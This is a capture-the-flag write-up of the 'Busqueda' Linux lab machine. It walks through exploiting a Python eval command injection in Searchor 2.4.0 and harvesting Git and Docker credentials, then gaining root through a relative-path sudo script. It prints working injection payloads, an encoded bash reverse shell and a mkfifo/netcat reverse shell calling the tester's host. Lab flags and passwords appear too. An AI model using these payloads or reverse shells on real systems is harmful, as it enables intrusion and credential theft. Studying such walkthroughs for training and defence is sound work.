# About Busqueda

Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a `Python` module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system checkup script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user&amp;amp;#039;s `Gitea` account. Further analysis of the system checkup script&amp;amp;#039;s source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges.



```bash
nmap -p- --min-rate 10000 10.129.148.230
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:14 CDT
Nmap scan report for 10.129.148.230
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds

```

Continued scanning 

```bash
nmap -p 22,80 -sCV 10.129.148.230
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:16 CDT
Nmap scan report for 10.129.148.230
Host is up (0.074s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

I added searcher.htb to my /etc/hosts file:

10.129.148.230 searcher.htb

Navigate to the site and notice is Powered by Flask and Searchor 2.4.0


If we follow the hyperlink on "Searchor 2.4.0" in the webpage footer, we are redirected to its GitHub
repository, where we can examine the changelog for the various released versions. There is a mention of a
priority vulnerability being patched in version 2.4.2 . The version in use by the website is 2.4.0 which
means that it is likely vulnerable.


Looking at the patch, we can see that the pull request is about patching a command injection vulnerability
present in the search functionality due to the use of an eval statement on unsanitized user input.

We can view the specific commit, which shows the eval statement that was replaced in the main.py file.
```py
   url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
```


employ a payload like the
following to exploit this vulnerability and achieve command injection

```bash

') + str(__import__('os').system('id')) #
```

```bash
uid=1000(svc) gid=1000(svc) groups=1000(svc) https://www.accuweather.com/en/search-locations?query=0
````

The output of the id command is returned successfully, indicating that our injection was successful.



To validate code execution on the remote host, let us proceed to submit the payload in the query
parameter of the web application.

```bash
')+ str(__import__('os').system('id'))#
```


```
uid=1000(svc) gid=1000(svc) groups=1000(svc) https://www.accuweather.com/en/search-locations?query=0
```

In order to leverage this into an interactive shell, we first start a Netcat listener on our local machine on
port 1337 

``bash
nc -nvlp 1337
listening on [any] 1337 ...
```
```sql
')+ str(__import__('os').system('echo
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvMTMzNyAwPiYx|base64 -d|bash'))#
```
I obtain a reverse shell on our Netcat listener.
```bash
connect to [10.10.14.126] from (UNKNOWN) [10.129.148.230] 47082
bash: cannot set terminal process group (1376): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 
```

The user flag can be obtained at /home/svc/user.txt .

```bash
svc@busqueda:/var/www/app$ cat /home/svc/user.txt
b4195a11055e4b8a1cbb7f3dda2ee1e8
```
By enumerating the files on the remote host, we can identify the credential pair
cody:jh1usoih2bkjaspwe92 stored in the /var/www/app/.git/config file. It also contains a reference to
the gitea.searcher.htb subdomain.

```bash
svc@busqueda:/var/www/app$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep svc        


-rw-rw-r-- 1 svc svc 76 Apr  3  2023 /home/svc/.gitconfig
-rw-r--r-- 1 svc svc 3771 Jan  6  2022 /home/svc/.bashrc
-rw-r--r-- 1 svc svc 220 Jan  6  2022 /home/svc/.bash_logout
-rw-r--r-- 1 svc svc 807 Jan  6  2022 /home/svc/.profile
```

```
svc@busqueda:/var/www/app$ cat /var/www/app/.git/config
cat /var/www/app/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

logged in using ssh

```bash
 ssh svc@10.129.148.230
```

```bash
Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
svc@busqueda:~$
```

navigate to 
> gitea.searcher.htb

Under the "Explore" section, it can be seen that there are 2 users on the Gitea application, namely cody
and administrator .

logged in as the user cody with the earlier obtained credentials, only to find a private repository
named Searcher_site which contains the source code of the Searcher web app


```bash
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```


Upon executing the Python script, a help menu displaying the usable arguments is presented.

```bash      
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```


```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
| jq
{"Id":"960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb","Created":"2023-01-06T17:26:54.457090149Z","Path":"/usr/bin/entrypoint","Args":["/bin/s6-svscan","/etc/s6"],"State":{"Status":"running","Running":true,"Paused":false,"Restarting":false,"OOMKilled":false,"Dead":false,"Pid":1863,"ExitCode":0,"Error":"","StartedAt":"2025-07-21T15:09:55.864844146Z","FinishedAt":"2023-04-04T17:03:01.71746837Z"},"Image":"sha256:6cd4959e1db11e85d89108b74db07e2a96bbb5c4eb3aa97580e65a8153ebcc78","ResolvConfPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/resolv.conf","HostnamePath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hostname","HostsPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hosts","LogPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.log","Name":"/gitea","RestartCount":0,"Driver":"overlay2","Platform":"linux","MountLabel":"","ProcessLabel":"","AppArmorProfile":"docker-default","ExecIDs":null,"HostConfig":{"Binds":["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro","/root/scripts/docker/gitea:/data:rw"],"ContainerIDFile":"","LogConfig":{"Type":"json-file","Config":{}},"NetworkMode":"docker_gitea","PortBindings":{"22/tcp":[{"HostIp":"127.0.0.1","HostPort":"222"}],"3000/tcp":[{"HostIp":"127.0.0.1","HostPort":"3000"}]},"RestartPolicy":{"Name":"always","MaximumRetryCount":0},"AutoRemove":false,"VolumeDriver":"","VolumesFrom":[],"CapAdd":null,"CapDrop":null,"CgroupnsMode":"private","Dns":[],"DnsOptions":[],"DnsSearch":[],"ExtraHosts":null,"GroupAdd":null,"IpcMode":"private","Cgroup":"","Links":null,"OomScoreAdj":0,"PidMode":"","Privileged":false,"PublishAllPorts":false,"ReadonlyRootfs":false,"SecurityOpt":null,"UTSMode":"","UsernsMode":"","ShmSize":67108864,"Runtime":"runc","ConsoleSize":[0,0],"Isolation":"","CpuShares":0,"Memory":0,"NanoCpus":0,"CgroupParent":"","BlkioWeight":0,"BlkioWeightDevice":null,"BlkioDeviceReadBps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteIOps":null,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpusetCpus":"","CpusetMems":"","Devices":null,"DeviceCgroupRules":null,"DeviceRequests":null,"KernelMemory":0,"KernelMemoryTCP":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"OomKillDisable":null,"PidsLimit":null,"Ulimits":null,"CpuCount":0,"CpuPercent":0,"IOMaximumIOps":0,"IOMaximumBandwidth":0,"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]},"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34-init/diff:/var/lib/docker/overlay2/bd9193f562680204dc7c46c300e3410c51a1617811a43c97dffc9c3ee6b6b1b8/diff:/var/lib/docker/overlay2/df299917c1b8b211d36ab079a37a210326c9118be26566b07944ceb4342d3716/diff:/var/lib/docker/overlay2/50fb3b75789bf3c16c94f888a75df2691166dd9f503abeadabbc3aa808b84371/diff:/var/lib/docker/overlay2/3668660dd8ccd90774d7f567d0b63cef20cccebe11aaa21253da056a944aab22/diff:/var/lib/docker/overlay2/a5ca101c0f3a1900d4978769b9d791980a73175498cbdd47417ac4305dabb974/diff:/var/lib/docker/overlay2/aac5470669f77f5af7ad93c63b098785f70628cf8b47ac74db039aa3900a1905/diff:/var/lib/docker/overlay2/ef2d799b8fba566ee84a45a0070a1cf197cd9b6be58f38ee2bd7394bb7ca6560/diff:/var/lib/docker/overlay2/d45da5f3ac6633ab90762d7eeac53b0b83debef94e467aebed6171acca3dbc39/diff","MergedDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/merged","UpperDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/diff","WorkDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/work"},"Name":"overlay2"},"Mounts":[{"Type":"bind","Source":"/root/scripts/docker/gitea","Destination":"/data","Mode":"rw","RW":true,"Propagation":"rprivate"},{"Type":"bind","Source":"/etc/localtime","Destination":"/etc/localtime","Mode":"ro","RW":false,"Propagation":"rprivate"},{"Type":"bind","Source":"/etc/timezone","Destination":"/etc/timezone","Mode":"ro","RW":false,"Propagation":"rprivate"}],"Config":{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}},"NetworkSettings":{"Bridge":"","SandboxID":"166a36acb42e1ff08182d379277088e62d89d1f7bb7739dea302f2c2046c7b04","HairpinMode":false,"LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"Ports":{"22/tcp":[{"HostIp":"127.0.0.1","HostPort":"222"}],"3000/tcp":[{"HostIp":"127.0.0.1","HostPort":"3000"}]},"SandboxKey":"/var/run/docker/netns/166a36acb42e","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null,"EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","MacAddress":"","Networks":{"docker_gitea":{"IPAMConfig":null,"Links":null,"Aliases":["server","960873171e2e"],"NetworkID":"cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227","EndpointID":"9a80fc2594f27f4a596a81fbad688580b208b0fef045dbd142c6020f964ac896","Gateway":"172.19.0.1","IPAddress":"172.19.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:13:00:02","DriverOpts":null}}}}
```

Using the obtained password yuiu1hoiu4i5ho1uh , we can log into the Gitea application as the
administrator user.


So, let's create a file /tmp/full-checkup.sh and insert a reverse shell payload into it.
We then make it executable.
Next, we start a Netcat listener on port 9001 on our local machine to receive the reverse shell.
Finally, we run the following command on the remote host from the /tmp directory to trigger the reverse
shell.
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.126
9001 >/tmp/f" > /tmp/full-checkup.sh
chmod +x /tmp/full-checkup.sh
nc -nvlp 9001
cd /tmp
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup


```bash
nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.126] from (UNKNOWN) [10.129.148.230] 36144
# cat /root/root.txt
14d5e015bd2f50a6cc2883e843d768df
# 

```
